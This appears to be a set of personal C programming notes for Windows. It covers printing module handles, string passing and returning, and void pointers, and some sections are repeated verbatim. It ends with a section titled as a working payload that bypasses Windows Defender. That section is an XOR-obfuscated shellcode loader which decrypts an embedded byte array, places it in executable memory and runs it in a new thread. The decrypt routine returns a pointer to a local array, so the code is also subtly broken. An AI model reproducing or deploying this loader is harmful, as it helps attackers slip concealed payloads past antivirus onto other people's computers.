C
========================

# Windows (only)

## printing hmodule

hmodule is type of variable that handles addresses. To print these variables we have the following instruction:

	printf("[*] Base address : 0x%.8x\n", (unsigned int) dllHandle);


## Passing string as a value

source: https://stackoverflow.com/questions/1846392/passing-string-as-an-argument-in-c

	int function1(char string[]) 
or

	void function(char *string)

## returning a string from a function	
	
If you want to return a string from a function, you either need to make the variable static which means it doesn't get deleted once the function ends (although then your function isn't thread-safe); or you need to allocate memory for the new string (using malloc() ) and copy the string into it (using strcpy() or strncpy() ).

	#include <stdio.h>
	#include <string.h>
	#define STR_SIZE 80
	void GetString( char* strOut, unsigned int strSize )
	{
	   strncpy( strOut, "Hello World", strSize );
	}
	int main()
	{
	   char buf[STR_SIZE + 1];
	   GetString( buf, STR_SIZE );
	   printf( "%s", buf );
	   return 0;
	}

## pointer sizes

source: https://stackoverflow.com/questions/494163/what-is-pvoid-data-type

It's a void pointer -- a pointer to a memory address with no information about the type of the value that it is pointing to. For this reason, you must cast the pointer to a type such as (char *)pMemPhy or (int *)pMemPhy before using the pointer so that the compiler knows how much memory it's working with (1 byte for a char, 4 bytes for an int, etc.)


## printing hmodule

hmodule is type of variable that handles addresses. To print these variables we have the following instruction:

	printf("[*] Base address : 0x%.8x\n", (unsigned int) dllHandle);


## Passing string as a value

source: https://stackoverflow.com/questions/1846392/passing-string-as-an-argument-in-c

	int function1(char string[]) 
or

	void function(char *string)

## returning a string from a function	
	
If you want to return a string from a function, you either need to make the variable static which means it doesn't get deleted once the function ends (although then your function isn't thread-safe); or you need to allocate memory for the new string (using malloc() ) and copy the string into it (using strcpy() or strncpy() ).

	#include <stdio.h>
	#include <string.h>
	#define STR_SIZE 80
	void GetString( char* strOut, unsigned int strSize )
	{
	   strncpy( strOut, "Hello World", strSize );
	}
	int main()
	{
	   char buf[STR_SIZE + 1];
	   GetString( buf, STR_SIZE );
	   printf( "%s", buf );
	   return 0;
	}

## pointer sizes

source: https://stackoverflow.com/questions/494163/what-is-pvoid-data-type

It's a void pointer -- a pointer to a memory address with no information about the type of the value that it is pointing to. For this reason, you must cast the pointer to a type such as (char *)pMemPhy or (int *)pMemPhy before using the pointer so that the compiler knows how much memory it's working with (1 byte for a char, 4 bytes for an int, etc.)

## payload funcional em C (bypass windows defender)

    
    #include <stdio.h>
    #include <string.h>
    #include <windows.h>


    char key[]= "\xaa\xbb\xcc\xdd";
	
    unsigned char buf[] = 
    "\x71\x74\x73\x90\x4a\x98\xfc\x04\xde\x9f\x38\x87\x9b\x72\x7d"
    "\x8f\x9b\xc1\xdb\x5e\x40\x47\xcf\xea\x59\x7a\x09\xe6\xb1\x3c"
    "\xea\x1e\x76\x53\x63\xfb\x47\x93\x07\xfe\xf4\x22\x53\xbc\xf9"
    "\xe9\x01\x4c\x4a\xad\x16\x4b\xeb\x27\xf0\x44\xf8\x36\xb1\x65"
    "\x7a\x77\x9d\xc7\x42\xa5\x68\x86\x87\xf9\x89\xd4\x4c\xb3\x34"
    "\x60\x29\xfe\x0d\xeb\x75\xf3\x8d\x76\x02\xd0\xac\xa7\x08\x8e"
    "\x6e\xa0\xcd\xf5\x27\xb8\xce\xd0\x69\xc3\xf4\xbc\xf8\x2b\x04"
    "\x53\x57\xea\xb5\xa0\x29\xad\x32\x7f\x5c\x55\x70\xc2\x6f\x92"
    "\x0a\x1e\xea\x96\xa8\x96\x5c\x6a\x18\x59\x8b\xe1\x12\xf4\xcf"
    "\xc7\x77\xf5\x0c\xcc\x73\x60\x2b\x28\xc1\x24\x0f\x0c\x9a\xc0"
    "\xa1\x9d\x37\x91\x5e\x4f\xd4\x29\xfa\x04\x39\x7c\x86\x5d\x51"
    "\x9f\xab\xe7\x56\x99\x3c\x94\x64\x56\x66\x18\xc8\xde\xb9\xcf"
    "\x2e\xe7\x0d\x51\xd1\xe4\xfe\x58\x15\xb0\xae\x60\xbc\x8f\x25"
    "\xe0\x3c\x5a\x72\xb0\x92\xe1\xb3\x00\x52\xb1\xdb\xea\x5d\xce"
    "\xcb\xe5\x77\xa6\x6e\x1e\x1c\x5a\x57\x17\x16\x31\x15\x11\xfb"
    "\xac\x9b\xf7\x91\x0c\xfd\x38\x7e\x95\xd4\xa0\xee\x15\x7a\x25"
    "\xec\x9f\xf9\x20\xa3\x76\xfc\x30\x54\x86\xc3\x92\x02\xf9\x69"
    "\x3a\x9c\x6b\xee\x2a\x9b\x72\x30\x7d\xbc\x84\x39\xf9\x21\xdd"
    "\x63\x87\xfc\x45\x44\x03\x27\x78\xdb\x02\xea\xc4\xf0\x12\x36"
    "\x3b\xb4\x66\xda\x6c\x1a\xc8\x9d\x3a\x54\x12\x4b\xc5\xbf\x5a"
    "\xde\xf6\x88\x0c\xd2\x23\xfe\xe0\x62\xce\xcf\x9f\x4f\xaa\x4f"
    "\xe6\xb1\x39\xa0\x4b\x35\x09\xea\x67\x1c\xe1\x23\xf2\x21\xbd"
    "\xdc\x47\x62\x85\x5f\xf3\x1b\x7f\x47\x86\x1e\x3a\xc7\x6d\x6e"
    "\x21\x35\x6b\xd1\x21\xe7";


unsigned char * futebol(){
	
	size_t bsize = sizeof(buf);

	size_t keylen = strlen(key);

	unsigned char decrypted[bsize];
	for (int i = 0; i < sizeof(buf)-1; i++){
		decrypted[i] = buf[i] ^ key[i % keylen];
	}
	
	return decrypted;
	
}

void main(int argc, char * argv []) { 
	
	unsigned char *gtrf;
	

	

	gtrf = futebol();


	LPVOID addressPointer = VirtualAlloc(NULL, sizeof(buf)-1, 0x3000, 0x40);

	//Copy shellcode
	RtlMoveMemory(addressPointer, gtrf, sizeof(buf)-1);

   	//Create thread pointing to shellcode address
   	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);
	
	Sleep(100);
	
}
